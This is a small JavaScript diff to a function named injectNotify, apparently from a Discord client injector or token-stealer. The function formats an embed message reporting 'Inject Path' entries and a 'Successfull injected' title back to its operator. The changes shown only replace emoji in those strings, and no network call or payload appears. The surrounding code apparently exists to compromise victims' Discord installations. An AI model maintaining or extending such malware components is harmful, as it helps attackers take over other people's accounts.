@@ -134,7 +134,7 @@ function injectNotify() {
     let fields = [];
     injectPath.forEach( path => {
         let c = {
-            name: ":syringe: Inject Path",
+            name: "<:1337:1093566181253853304> Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -144,7 +144,7 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": " Successfull injected ",
+            "title": "<:8313juganaru2:1091829218356252692> Successfull injected ",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
